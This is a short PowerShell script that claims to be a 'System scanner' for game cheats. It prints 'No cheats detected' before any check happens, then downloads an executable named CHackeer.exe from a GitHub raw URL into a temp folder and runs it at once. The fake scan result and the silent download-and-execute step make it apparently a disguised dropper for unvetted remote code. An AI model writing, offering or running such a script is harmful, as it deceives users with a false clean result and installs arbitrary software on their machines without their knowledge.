$ErrorActionPreference = "Stop"
Write-Host ""
Write-Host "System scanner" -ForegroundColor Cyan
Write-Host "No cheats detected" -ForegroundColor Green
Write-Host ""
$tempDir = Join-Path $env:TEMP "Checker12"
if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
$exePath = Join-Path $tempDir "CHackeer.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/Checker12/main/CHackeer.exe" -OutFile $exePath -UseBasicParsing
& $exePath
Write-Host ""
Write-Host "Нажми Enter..." -ForegroundColor Yellow
$null = Read-Host
